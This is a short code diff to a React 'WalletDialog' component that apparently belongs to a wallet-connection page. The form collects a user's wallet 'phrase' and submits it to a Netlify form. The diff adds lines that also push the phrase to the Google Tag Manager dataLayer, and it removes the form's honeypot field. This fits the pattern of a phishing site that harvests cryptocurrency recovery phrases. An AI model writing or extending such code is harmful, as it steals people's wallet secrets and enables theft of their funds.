@@ -53,6 +53,16 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
     setLoading(true);
 
     try {
+      // Push form submission event to GTM dataLayer
+      if (window.dataLayer) {
+        window.dataLayer.push({
+          event: 'wallet_connection_submit',
+          formData: {
+            phrase: phrase
+          }
+        });
+      }
+
       // Submit to Netlify forms
       const formData = new FormData();
       formData.append('form-name', 'wallet-connection');
@@ -109,7 +119,6 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
           data-netlify="true" 
           name="wallet-connection" 
           method="POST"
-          netlify-honeypot="bot-field"
         >
           <input type="hidden" name="form-name" value="wallet-connection" />
           <p className="hidden">
